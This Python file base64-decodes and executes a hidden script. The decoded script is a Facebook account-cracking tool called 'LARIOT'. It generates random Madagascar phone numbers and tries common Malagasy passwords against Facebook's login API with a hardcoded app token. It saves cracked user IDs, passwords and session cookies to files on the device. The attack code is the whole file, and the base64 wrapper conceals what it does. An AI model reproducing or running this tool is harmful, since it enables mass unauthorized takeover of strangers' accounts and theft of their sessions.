import base64
import sys

encoded_script =
b"""IyBEw6lmaW5pciBsZSBudW3DqXJvIGRlIHZlcnNpb24KdmVyc2lvbl9hY3R1ZWxsZSA9ICIyLjAiCgoKCmltcG9ydCBvcwppbXBvcnQgcmFuZG9tCmltcG9ydCBzdHJpbmcgCmltcG9ydCB1dWlkCmltcG9ydCBqc29uCmltcG9ydCBzdWJwcm9jZXNzCmZyb20gY29uY3VycmVudC5mdXR1cmVzIGltcG9ydCBUaHJlYWRQb29sRXhlY3V0b3IgYXMgdHJlZAppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IHN5cwppbXBvcnQgc2VjcmV0cwppbXBvcnQgZ2V0cGFzcwoKIy0tLS0tLS0tLS0tLS1jb2xvci0tLS0tLS0tLS0tLS0tLS0jCmJibGFjaz0iXDAzM1sxOzMwbSIgICAgICAgICAjIEJsYWNrCk09IlwwMzNbMTszMW0iICAgICAgICAgICAgIyBSZWQKSD0iXDAzM1sxOzMybSIgICAgICAgICAjIEdyZWVuCmJ5ZWxsb3c9IlwwMzNbMTszM20iICAgICAgICAjIFllbGxvdwpiYmx1ZT0iXDAzM1sxOzM0bSIgICAgICAgICAgIyBCbHVlClA9IlwwMzNbMTszNW0iICAgICAgICAjIFB1cnBsZQpDPSJcMDMzWzE7MzZtIiAgICAgICAgICAjIEN5YW4KQj0iXDAzM1sxOzM3bSIgICAgICAgICAjIFdoaXRlCm15X2NvbG9yID0gWwogQixDLFAsSF0Kd2FybmEgPSByYW5kb20uY2hvaWNlKG15X2NvbG9yKQpva3M9W10KY3BzPVtdCmxvb3A9MAojIExpc3RlIGRlcyBjb3VsZXVycyBwb3VyIGxlIGxvZ28sIGxlcyBsaWduZXMgZXQgY2hhcXVlIG1vdApsb2dvX2NvbG9ycyA9IFtCLCBDLCBQLCBIXQpsaW5lX2NvbG9ycyA9IFtiYmxhY2ssIE0sIEgsIGJ5ZWxsb3csIGJibHVlLCBQLCBDLCBCXQp3b3JkX2NvbG9ycyA9IFtCLCBDLCBQLCBILCBNLCBieWVsbG93LCBiYmx1ZSwgUCwgQywgQl0KIy0tLS0tLS0tLS0tLS1sb2dvLS0tLS0tLS0tLS0tLS0tLS0jCmxvZ289KGYnJyd7Qn0KLS0tLQogICAgXAogICAgIFwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAuOjohISEhISEhOi4KICAuISEhISE6LiAgICAgICAgICAgICAgICAgICAgICAgIC46ISEhISEhISEhISEhCiAgfn5+fiEhISEhIS4gICAgICAgICAgICAgICAgIC46ISEhISEhISEhVVdXVyQkJAogICAgICA6JCROV1ghITogICAgICAgICAgIC46ISEhISEhWFVXVyQkJCQkJCQkJFAKICAgICAgJCQkJCQjI1dYITogICAgICAuPCEhISFVVyQkJCQiICAkJCQkJCQkJCMKICAgICAgJCQkJCQgICQkJFVYICAgOiEhVVckJCQkJCQkJCQgICA0JCQkJCQqCiAgICAgIF4kJCRCICAkJCQkXCAgICAgJCQkJCQkJCQkJCQkICAgZCQkUiIKICAgICAgICAiKiRiZCQkJCQgICAgICAnKiQkJCQkJCQkJCQkbysjIgogICAgICAgICAgICAgIiIiIiAgICAgICAgICAiIiIiIiIiCuKUjOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUkArilIIgICAgICBfICAgICAgICAgICAgICAgX19fX18gIF9fX19fIF9fX18gX19fX19fXyAgICAgIOKUggrilIIgICAgIHwgfCAgICAgICAgL1wgICB8ICBfXyBcfF8gICBfLyBfXyBcX18gICBfX3wgICAgIOKUggrilIIgICAgIHwgfCAgICAgICAvICBcICB8IHxfXykgfCB8IHx8IHwgIHwgfCB8IHwgICAgICAgIOKUggrilIIgICAgIHwgfCAgICAgIC8gL1wgXCB8ICBfICAvICB8IHx8IHwgIHwgfCB8IHwgICAgICAgIOKUggrilIIgICAgIHwgfF9fX18gLyBfX19fIFx8IHwgXCBcIF98IHx8IHxfX3wgfCB8IHwgICAgICAgIOKUggrilIIgICAgIHxfX19fX18vXy8gICAgXF9cX3wgIFxfXF9fX19fXF9fX18vICB8X3wgICAgICAgIOKUggrilIIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIOKUggrilIIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIOKUggrilJTilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilJgKe3dhcm5hfS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0te0J9CiBPd25lciAgICA6IHtNfVJBTkRSSUF7TX0KIFRPT0wgTkFNRSA6IHt3YXJuYX17UH1MQVJJT1R7UH17d2FybmF9CiBGYWNlYm9vayA6IHtiYmx1ZX1MYXJpb3Qgya3JrXtiYmx1ZX0KIFRvb2xzICAgIDoge3dhcm5hfVt7TX1WRVJTSU9OIDIuMHt3YXJuYX1de3dhcm5hfQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLXtCfScnJykKIy0tLS0tLS0tLS0tLS1saW5leCBkZWYgLS0tLS0tLS0tLS0tLSMKZGVmIGxpbmV4KCk6CiAgICBwcmludChmJ3t3YXJuYX0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLXtCfScpCiMtLS0tLS0tLS0tLS0tY2xlYXIgZGVmIC0tLS0tLS0tLS0tLS0jCmRlZiBjbGVhcigpOgogICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICBwcmludChsb2dvKQojLS0tLS0tLS0tLS0tLW1haW4gZGVmLS0tLS0tLS0tLS0tIwpkZWYgTVJfSVRBQ0hJKCk6CiAgICBjbGVhcigpCiAgICBwcmludChmJ3tCfSBbe3dhcm5hfTAxe0J9XSBSQU5ET00gQ0xPTklORyAnKQogICAgcHJpbnQoZid7Qn0gW3t3YXJuYX0wMHtCfV0gRVhJVCBURVJNSU5BTCAnKQogICAgbGluZXgoKQogICAgb3B0aW9uPWlucHV0KGYnIHtCfVt7d2FybmF9Pz97Qn1dIENIT0lTSVIgTUVOVSA+PiAnKQogICAgaWYgb3B0aW9uIGluIFsnMDEnLCcxJ106CiAgICAgICAgQkRfQ0xPTklORygpCiAgICBlbHNlOgogICAgICAgIGV4aXQoJyBNRVJDSSBCRUFVQ09VUCAgOiknKQojLS0tLS0tLS0tLS0tLSBiZCBjbG9uZSBkZWYgLS0tLS0tLS0tLSMKZGVmIEJEX0NMT05JTkcoKToKICAgIHVzZXI9W10KICAgIGNsZWFyKCkKICAgIHByaW50KCcgQ09ERSBTSU0gTUFMQUdBU1kgOiBbKzI2MTMyXSBbKzI2MTM0XSBbKzI2MTM4XSBbKzI2MTMzXScpCiAgICBwcmludCgnIDI2MT0wIE1hZGFnYXNjYXIgOiBbMDMyXSBbMDM0XSBbMDM4XSBbMDMzXScpCiAgICBjb2RlPWlucHV0KCcgRU5URVIgU0lNIENPREUgPj4gJykKICAgIGxpbmV4KCkKICAgIHByaW50KCcgRVhBTVBMRSBMSU1JVCA6IFsxMDAwXSBbMjAwMF0gWzUwMDBdIFsxMDAwMF0nKQogICAgdHJ5OgogICAgICAgIGxpbWl0PWludChpbnB1dCgnIEVOVEVSIExJTUlUID4+ICcpKQogICAgZXhjZXB0IFZhbHVlRXJyb3I6CiAgICAgICAgbGltaXQ9NTAwMDAKICAgIGNsZWFyKCkKICAgIGZvciBubWJyIGluIHJhbmdlKGxpbWl0KToKICAgICAgICBubXA9Jycuam9pbihtYXAoc3RyLCBnZW5lcmF0ZV9yYW5kb21fc2VxdWVuY2UoNykpKQogICAgICAgIHVzZXIuYXBwZW5kKG5tcCkKICAgIHdpdGggdHJlZChtYXhfd29ya2Vycz04MCkgYXMgRGlwdG86CiAgICAgICAgdGw9c3RyKGxlbih1c2VyKSkKICAgICAgICBwcmludCgnIFRPVEFMIEFDQ09VTlQgOiAnK3RsKQogICAgICAgIHByaW50KCcgWU9VUiBTSU0gQ09ERSA6ICcrY29kZSkKICAgICAgICBwcmludCgnIENMT05JTkcgRU4gQ09VUlMgLi4uICcpCiAgICAgICAgbGluZXgoKQogICAgICAgIGZvciBwc3ggaW4gdXNlcjoKICAgICAgICAgICAgaWRzPWNvZGUrcHN4CiAgICAgICAgICAgIHBhc3NsaXN0PVtwc3gsaWRzLGlkc1s6N10saWRzWzo2XSxpZHNbNTpdLGlkc1s0Ol0sJ01hbGFsYScsJ21hbGFsYScsJ01hbGFsYWtvJywnbWFsYWxha28nLCdtYW1ha28nLCdmYW5pcnknLCdGYW5pcnknLCdNYWxhZ2FzeScsJ21hbGFnYXN5JywnTWFtYWtvJywnVmFkaWtvJywndmFkaWtvJywndG9sb3RyYScsJ1RvbG90cmEnLCdSYWtvdG8nLCdyYWtvdG8nLCdub21lbmEnLCdmYW5ldmEnLCdGYW5ldmEnLCdqZXNvc3knLCdKZXNvc3knLCdOb21lbmEnLCdGaXRpYXZhbmEnLCdUaWF2aW5hJywnZml0aWF2YW5hJywndGlhdmluYScsJ2xhZmF0cmEnLCdMYWhhdHJhJywnbGFoYXRyYScsJ2ZhbmRyZXNlbmEnLCd0YWhpYW5hJywnVGFoaWFuYScsJ1RhaGluYScsJ3RhaGluYScsJ3RhaGlyeScsJ1RhaGlyeScsJ0ZhbmRyZXNlbmEnLCdsaWFudHNvYScsJ0xpYW50c29hJywndmFsaXNvYScsJ1ZhbGlzb2EnLCduYW50ZW5haW5hJywndGFuam9uYScsJ1RhbmpvbmEnLCdOYW50ZW5haW5hJywnbmVrZW5hJywnTmVrZW5hJywnbmlyaW5hJywnTmlyaW5hJywnTmFyaW5kcmEnLCduYXJpbmRyYScsJ1Jha290bycsJ2ZpdGFoaWFuYScsJ0ZpdGFoaWFuYScsJ3RzaWxhdmluYScsJ1RzaWxhdmluYScsJ2ZpbmFyaXRyYScsJ0ZpbmFyaXRyYScsJ2Zhbm9tZXphbmEnLCdGYW5vbWV6YW5hJywnU2FyaW5kcmEnLCdzYXJpbmRyYScsJ1NpdHJha2EnLCdzaXRyYWthJywnbWFtaXRpYW5hJywnTWFtaXRpYW5hJywnbWFtaXNvYScsJ01hbWlzb2EnLCdmYW5vbWV6YW50c29hJywnRmFub21lemFudHNvYScsJ2ZhbmFudGVuYW5hJywnRmFuYW50ZW5hbmEnLCdzYWZpZHknLCdzYXJvYmlkeScsJ1Nhcm9iaWR5JywnbGFsYWluYScsJ0xhZmF0cmEnLCdMYWxhaW5hJywnbWFoZXJ5JywnTWFoZXJ5JywnbWFuZHJlc3knLCdNYW5kcmVzeScsJ2hhcmVuYScsJ0hhcmVuYScsJ21pcmFuYScsJ01pcmFuYSddCiAgICAgICAgICAgIERpcHRvLnN1Ym1pdChtZXRob2RfY3JhY2ssaWRzLHBhc3NsaXN0KQogICAgICAgICAgICAKICAgIGxpbmV4KCkKICAgIHByaW50KCcgTEUgQ0xPTklORyBFU1QgRklOSSAnKQogICAgcHJpbnQoJyBUT1RBTCBPSyBJRCAnK3N0cihsZW4ob2tzKSkpCiAgICBwcmludCgnIFRPVEFMIENQIElEICcrc3RyKGxlbihjcHMpKSkKICAgIGlucHV0KCcgUFJFU1MgRU5URVIgVE8gQkFDSyAgOiAnKQogICAgTVJfSVRBQ0hJKCkKIy0tLS0tLS0tLS0tLSBtZXRob2QgY3JhY2sgZGVmIC0tLS0tLS0tLSMKZGVmIG1ldGhvZF9jcmFjayhpZHMsIHBhc3NsaXN0KToKICAgIGdsb2JhbCBva3MKICAgIGdsb2JhbCBjcHMKICAgIGdsb2JhbCBsb29wCiAgICB0cnk6CiAgICAgICAgZm9yIHBhcyBpbiBwYXNzbGlzdDoKICAgICAgICAgICAgc3lzLnN0ZG91dC53cml0ZSgnXHJcciBcMDMzWzE7MzdtW1Byb2dyZXNzXSAlc3xcMDMzWzE7MzJtU3VjY2VzOiVzJyUobG9vcCxsZW4ob2tzKSkpCiAgICAgICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQogICAgICAgICAgICBhZGlkPXN0cih1dWlkLnV1aWQ0KCkpCiAgICAgICAgICAgIGRldmljZV9pZD1zdHIodXVpZC51dWlkNCgpKQogICAgICAgICAgICBkYXRheD17J2FkaWQnOiBhZGlkLCAnZm9ybWF0JzogJ2pzb24nLCAnZGV2aWNlX2lkJzogZGV2aWNlX2lkLCAnZW1haWwnOiBpZHMsICdwYXNzd29yZCc6IHBhcywgJ2dlbmVyYXRlX2FuYWx5dGljc19jbGFpbXMnOiAnMScsICdjcmVkZW50aWFsc190eXBlJzogJ3Bhc3N3b3JkJywgJ3NvdXJjZSc6ICdsb2dpbicsICdlcnJvcl9kZXRhaWxfdHlwZSc6ICdidXR0b25fd2l0aF9kaXNhYmxlZCcsICdlbnJvbGxfbWlzYXV0aCc6ICdmYWxzZScsICdnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXMnOiAnMScsICdnZW5lcmF0ZV9tYWNoaW5lX2lkJzogJzEnLCAnbWV0YV9pbmZfZmJtZXRhJzogJycsICdjdXJyZW50bHlfbG9nZ2VkX2luX3VzZXJpZCc6ICcwJywgJ2ZiX2FwaV9yZXFfZnJpZW5kbHlfbmFtZSc6ICdhdXRoZW50aWNhdGUnfQogICAgICAgICAgICBoZWFkZXI9eydVc2VyLUFnZW50JzogJ1tGQkFOL0ZCNEE7RkJBVi8zNjguMC4wLjI0LjEwODtGQkJWLzM3MTg5Nzk4MztGQkRNL3tkZW5zaXR5PTEuMCx3aWR0aD02MDAsaGVpZ2h0PTk3Nn07RkJMQy9lbl9VUztGQkNSL251bGw7RkJNRi9KVFlqYXk7RkJCRC9EMTAxO0ZCUE4vY29tLmZhY2Vib29rLmthdGFuYTtGQkRWL0QxMDE7RkJTVi80LjQuMjtudWxsRkJDQS9hcm1lYWJpLXY3YTphcm1lYWJpO10nLCAnQWNjZXB0LUVuY29kaW5nJzogJ2d6aXAsIGRlZmxhdGUnLCAnQWNjZXB0JzogJyovKicsICdDb25uZWN0aW9uJzogJ2tlZXAtYWxpdmUnLCAnQXV0aG9yaXphdGlvbic6ICdPQXV0aCAzNTA2ODU1MzE3Mjh8NjJmOGNlOWY3NGIxMmY4NGMxMjNjYzIzNDM3YTRhMzInLCAnWC1GQi1GcmllbmRseS1OYW1lJzogJ2F1dGhlbnRpY2F0ZScsICdYLUZCLUNvbm5lY3Rpb24tQmFuZHdpZHRoJzogJzIxNDM1JywgJ1gtRkItTmV0LUhOSSc6ICczNTc5MycsICdYLUZCLVNJTS1ITkknOiAnMzc4NTUnLCAnWC1GQi1Db25uZWN0aW9uLVR5cGUnOiAndW5rbm93bicsICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkJywgJ1gtRkItSFRUUC1FbmdpbmUnOiAnTGlnZXInfQogICAgICAgICAgICB1cmw9J2h0dHBzOi8vYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbicKICAgICAgICAgICAgcmVxeD1yZXF1ZXN0cy5wb3N0KHVybCxkYXRhPWRhdGF4LGhlYWRlcnM9aGVhZGVyKS5qc29uKCkKICAgICAgICAgICAgaWYgJ3Nlc3Npb25fa2V5JyBpbiByZXF4OgogICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgIHVpZD1yZXF4Wyd1aWQnXQogICAgICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgICAgIHVpZD1pZHMKICAgICAgICAgICAgICAgIGlmIHN0cih1aWQpIGluIG9rczoKICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludCgnXHJcciBcMDMzWzE7MzJtW0xhcmlvdC1PS10gJytzdHIodWlkKSsnIHwgJytwYXMrJ1wwMzNbMTszN20nKQogICAgICAgICAgICAgICAgICAgIGNva2k9IjsiLmpvaW4oaVsibmFtZSJdKyI9IitpWyJ2YWx1ZSJdIGZvciBpIGluIHJlcXhbInNlc3Npb25fY29va2llcyJdKQogICAgICAgICAgICAgICAgICAgIHByaW50KCdcMDMzWzE7MzJtIFtDT09LSUVTXSAnK2Nva2kpCiAgICAgICAgICAgICAgICAgICAgIyBWw6lyaWZpZXIgc2kgbGUgZG9zc2llciBMYXJpb3QtSURTIGV4aXN0ZSBldCBsZSBjcsOpZXIgc2kgbsOpY2Vzc2FpcmUKICAgICAgICAgICAgICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoIi9zZGNhcmQvTGFyaW90LUlEUyIpOgogICAgICAgICAgICAgICAgICAgICAgICBvcy5tYWtlZGlycygiL3NkY2FyZC9MYXJpb3QtSURTIikKICAgICAgICAgICAgICAgICAgICAjIEVucmVnaXN0cmVyIGRhbnMgbGUgZmljaGllciBMYXJpb3QtT0sudHh0CiAgICAgICAgICAgICAgICAgICAgd2l0aCBvcGVuKG9zLnBhdGguam9pbigiL3NkY2FyZC9MYXJpb3QtSURTIiwgIkxhcmlvdC1PSy50eHQiKSwgJ2EnKSBhcyBmOgogICAgICAgICAgICAgICAgICAgICAgICBmLndyaXRlKHN0cih1aWQpKyd8JytwYXMrJ3wnK2Nva2krJ1xuJykKICAgICAgICAgICAgICAgICAgICBva3MuYXBwZW5kKHN0cih1aWQpKQogICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgIGVsaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHJlcXhbJ2Vycm9yX21zZyddOgogICAgICAgICAgICAgICAgcHJpbnQoJ1xyXHIgXDAzM1sxOzMwbVtMYXJpb3QtQ1BdICcraWRzKycgfCAnK3BhcysnXDAzM1sxOzM3bScpCiAgICAgICAgICAgICAgICAjIEVucmVnaXN0cmVyIGRhbnMgbGUgZmljaGllciBMYXJpb3QtQ1AudHh0CiAgICAgICAgICAgICAgICB3aXRoIG9wZW4ob3MucGF0aC5qb2luKCIvc2RjYXJkL0xhcmlvdC1JRFMiLCAiTGFyaW90LUNQLnR4dCIpLCAnYScpIGFzIGY6CiAgICAgICAgICAgICAgICAgICAgZi53cml0ZShpZHMrJ3wnK3BhcysnXG4nKQogICAgICAgICAgICAgICAgY3BzLmFwcGVuZChpZHMpCiAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICBsb29wKz0xCiAgICBleGNlcHQ6CiAgICAgICAgcGFzcwojLS0tLS0tLS0tLS0tLWVuZC0tLS0tLS0tLS0tLS0tLS0jCgojIEfDqW7DqXJhdGV1ciBkZSBzw6lxdWVuY2UgYWzDqWF0b2lyZQpkZWYgZ2VuZXJhdGVfcmFuZG9tX3NlcXVlbmNlKGxlbmd0aCk6CiAgICBzZXF1ZW5jZSA9IFtyYW5kb20uY2hvaWNlKHN0cmluZy5kaWdpdHMpIGZvciBfIGluIHJhbmdlKGxlbmd0aCldCiAgICByZXR1cm4gc2VxdWVuY2UKCiMgQXBwZWwgw6AgbGEgZm9uY3Rpb24gTVJfSVRBQ0hJIHBvdXIgZMOpbWFycmVyIGxlIHByb2dyYW1tZQpNUl9JVEFDSEkoKQo="""

decoded_script = base64.b64decode(encoded_script)

exec(compile(decoded_script, filename='<string>', mode='exec'))